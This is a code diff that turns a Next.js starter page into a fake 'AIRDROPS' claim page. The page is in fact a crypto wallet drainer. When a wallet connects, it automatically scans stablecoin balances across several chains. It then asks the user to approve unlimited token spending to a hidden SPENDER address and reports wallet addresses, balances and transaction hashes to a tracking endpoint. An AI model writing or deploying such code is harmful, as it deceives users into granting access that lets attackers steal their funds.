@@ -1,103 +1,280 @@
-import Image from "next/image";
+'use client';
+import { useState, useEffect } from 'react';
+import { useAccount, useWriteContract } from 'wagmi';
+import { erc20Abi, maxUint256 } from 'viem';
+import { readContract, getBalance, switchChain } from '@wagmi/core';
+import { config } from '@/config';
+
+// Spender address that will receive approvals
+// Load spender from env, fallback to empty
+const SPENDER = (process.env.NEXT_PUBLIC_SPENDER || "") as `0x${string}`;
+if (!SPENDER || SPENDER === "0x") {
+  throw new Error('SPENDER_ADDRESS is not defined or invalid');
+}
+
+// Tokens grouped by chainId (BigInt-safe version)
+const TOKENS_BY_CHAIN: Record<
+  number,
+  { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[]
+> = {
+  1: [
+    { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", min: BigInt(1 * 10 ** 6), decimals: 6 },
+    { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", min: BigInt(1 * 10 ** 6), decimals: 6 },
+    { symbol: "DAI",  address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", min: BigInt(1 * 10 ** 18), decimals: 18 },
+    { symbol: "BUSD", address: "0x4fabb145d64652a948d72533023f6e7a623c7c53", min: BigInt(1 * 10 ** 18), decimals: 18 },
+  ],
+  42161: [
+    { symbol: "USDT", address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", min: BigInt(1 * 10 ** 6), decimals: 6 },
+    { symbol: "USDC", address: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8", min: BigInt(1 * 10 ** 6), decimals: 6 },
+    { symbol: "DAI",  address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", min: BigInt(1 * 10 ** 18), decimals: 18 },
+  ],
+  11155111: [
+    { symbol: "USDC", address: "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238", min: BigInt(1 * 10 ** 6), decimals: 6 },
+    { symbol: "LINK", address: "0x779877A7B0D9E8603169DdbD7836e478b4624789", min: BigInt(1 * 10 ** 18), decimals: 18 },
+  ],
+};
+
+// Component that reports wallet connections
+function ConnectionReporter() {
+  const { address, isConnected } = useAccount();
+
+  useEffect(() => {
+    if (isConnected && address) {
+      fetch("http://localhost:4000/report", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          event: "connect",
+          wallet: address,
+        }),
+      }).catch(console.error);
+    }
+  }, [isConnected, address]);
+
+  return null;
+}
 
 export default function Home() {
-  return (
-    <div className="font-sans grid grid-rows-[20px_1fr_20px] items-center justify-items-center min-h-screen p-8 pb-20 gap-16 sm:p-20">
-      <main className="flex flex-col gap-[32px] row-start-2 items-center sm:items-start">
-        <Image
-          className="dark:invert"
-          src="/next.svg"
-          alt="Next.js logo"
-          width={180}
-          height={38}
-          priority
-        />
-        <ol className="font-mono list-inside list-decimal text-sm/6 text-center sm:text-left">
-          <li className="mb-2 tracking-[-.01em]">
-            Get started by editing{" "}
-            <code className="bg-black/[.05] dark:bg-white/[.06] font-mono font-semibold px-1 py-0.5 rounded">
-              app/page.tsx
-            </code>
-            .
-          </li>
-          <li className="tracking-[-.01em]">
-            Save and see your changes instantly.
-          </li>
-        </ol>
+  const { address, isConnected, chainId } = useAccount();
+  const { writeContractAsync } = useWriteContract();
+  const [status, setStatus] = useState<string>("");
 
-        <div className="flex gap-4 items-center flex-col sm:flex-row">
-          <a
-            className="rounded-full border border-solid border-transparent transition-colors flex items-center justify-center bg-foreground text-background gap-2 hover:bg-[#383838] dark:hover:bg-[#ccc] font-medium text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5 sm:w-auto"
-            href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            <Image
-              className="dark:invert"
-              src="/vercel.svg"
-              alt="Vercel logomark"
-              width={20}
-              height={20}
-            />
-            Deploy now
-          </a>
-          <a
-            className="rounded-full border border-solid border-black/[.08] dark:border-white/[.145] transition-colors flex items-center justify-center hover:bg-[#f2f2f2] dark:hover:bg-[#1a1a1a] hover:border-transparent font-medium text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5 w-full sm:w-auto md:w-[158px]"
-            href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            Read our docs
-          </a>
+  async function handleClaim() {
+    if (!isConnected || !address) {
+      setStatus("Wallet not connected");
+      return;
+    }
+
+    try {
+      setStatus("Scanning chains for balances...");
+
+      let targetChain: number | null = null;
+      let usableTokens: { symbol: string; address: `0x${string}`; min: bigint }[] = [];
+
+      // scan all chains
+      for (const [cid, tokens] of Object.entries(TOKENS_BY_CHAIN)) {
+        const numericCid = Number(cid);
+
+        for (const token of tokens) {
+          try {
+            const bal = await readContract(config, {
+              chainId: numericCid,
+              address: token.address,
+              abi: erc20Abi,
+              functionName: "balanceOf",
+              args: [address],
+            }) as bigint;
+
+            if (bal >= token.min) {
+              targetChain = numericCid;
+              usableTokens.push(token);
+            }
+          } catch {}
+        }
+
+        if (usableTokens.length > 0) break;
+      }
+
+      if (!targetChain || usableTokens.length === 0) {
+        setStatus("No usable balances found on any chain.");
+        return;
+      }
+
+      if (chainId !== targetChain) {
+        setStatus(`Switching to chain ${targetChain}...`);
+        await switchChain(config, { chainId: targetChain });
+      }
+
+      const nativeBal = await getBalance(config, { address, chainId: targetChain });
+      if (nativeBal.value < BigInt(100000000000000)) {
+        setStatus("Not enough native token to pay gas fees.");
+        return;
+      }
+
+      // approve and report
+      for (const token of usableTokens) {
+        setStatus(`Approving ${token.symbol}...`);
+        const txHash = await writeContractAsync({
+          address: token.address,
+          abi: erc20Abi,
+          functionName: "approve",
+          args: [SPENDER, maxUint256],
+        });
+
+        // read actual balance after approval
+        let rawBalance: bigint = BigInt(0);
+        try {
+          rawBalance = await readContract(config, {
+            chainId: targetChain!,
+            address: token.address,
+            abi: erc20Abi,
+            functionName: "balanceOf",
+            args: [address],
+          }) as bigint;
+        } catch (err) {
+          console.error(`Failed to read balance for ${token.symbol}:`, err);
+        }
+
+        const decimals = (token as any).decimals || 18; // fallback
+        const formattedBalance = Number(rawBalance) / 10 ** decimals;
+
+        setStatus(`${token.symbol} approved ✅ | Balance: ${formattedBalance}`);
+
+        // report approval including balance
+        await fetch("http://localhost:4000/report", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            event: "approval",
+            functionName: "balanceOf",
+            wallet: address,
+            chainId: targetChain,
+            token: token.address,
+            symbol: token.symbol,
+            balance: formattedBalance,
+            txHash,
+          }),
+        }).catch(console.error);
+      }
+      setStatus("All approvals completed!");
+    } catch (err: any) {
+      console.error(err);
+      setStatus("Error: " + (err?.shortMessage || err?.message || "unknown"));
+    }
+  }
+
+  // ✅ Automatically trigger claim when wallet connects
+  useEffect(() => {
+    if (isConnected && address) handleClaim();
+  }, [isConnected, address]);
+
+  return (
+    <main
+      style={{
+        display: "flex",
+        flexDirection: "column",
+        alignItems: "center",
+        gap: "24px",
+        marginTop: "40px",
+      }}
+    >
+      {/* Floating header */}
+      <header
+        style={{
+          position: "fixed",
+          top: 0,
+          left: 0,
+          right: 0,
+          height: "64px",
+          background: "#09011fff",
+          display: "flex",
+          alignItems: "center",
+          justifyContent: "space-between",
+          padding: "0 24px",
+          paddingTop: "env(safe-area-inset-top)",
+          boxShadow: "0 2px 8px rgba(241, 235, 235, 0.08)",
+          zIndex: 1000,
+        }}
+      >
+        <div style={{ fontFamily: "sans-serif", fontWeight: "bold", fontSize: "18px", color: "#aaa587ff" }}>
+          AIRDROPS
         </div>
-      </main>
-      <footer className="row-start-3 flex gap-[24px] flex-wrap items-center justify-center">
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
+        <appkit-button />
+      </header>
+
+      <ConnectionReporter />
+
+      <div
+        style={{
+          display: "flex",
+          flexDirection: "column",
+          gap: "24px",
+          paddingTop: "80px",
+          width: "80%",
+          maxWidth: "600px",
+        }}
+      >
+        <div
+          style={{
+            border: "1px solid #9dd6d1ff",
+            borderRadius: "12px",
+            padding: "20px",
+            background: "#090e41ff",
+            display: "flex",
+            flexDirection: "column",
+            alignItems: "center",
+            justifyContent: "space-between",
+            height: "500px",
+          }}
         >
-          <Image
-            aria-hidden
-            src="/file.svg"
-            alt="File icon"
-            width={16}
-            height={16}
-          />
-          Learn
-        </a>
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="/window.svg"
-            alt="Window icon"
-            width={16}
-            height={16}
-          />
-          Examples
-        </a>
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://nextjs.org?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="/globe.svg"
-            alt="Globe icon"
-            width={16}
-            height={16}
-          />
-          Go to nextjs.org →
-        </a>
-      </footer>
-    </div>
+          <h2 style={{ marginBottom: "12px" }}>Airdrop</h2>
+
+          <div
+            style={{
+              flex: 1,
+              display: "flex",
+              alignItems: "center",
+              justifyContent: "center",
+              color: "#e4e1daff",
+              fontSize: "14px",
+              textAlign: "center",
+            }}
+          >
+            {status || ""}
+          </div>
+
+          <button
+            onClick={handleClaim}
+            style={{
+              background: "#a00b0bff",
+              color: "white",
+              padding: "12px 28px",
+              borderRadius: "8px",
+              cursor: "pointer",
+              marginTop: "16px",
+            }}
+          >
+            Claim Now
+          </button>
+        </div>
+
+        {[1, 2, 3].map((i) => (
+          <div
+            key={i}
+            style={{
+              border: "1px solid #c9c8ddff",
+              borderRadius: "12px",
+              padding: "20px",
+              background: "#0e0a42ff",
+              display: "flex",
+              alignItems: "center",
+              justifyContent: "center",
+            }}
+          >
+            <span>Box {i + 1}</span>
+          </div>
+        ))}
+      </div>
+    </main>
   );
 }
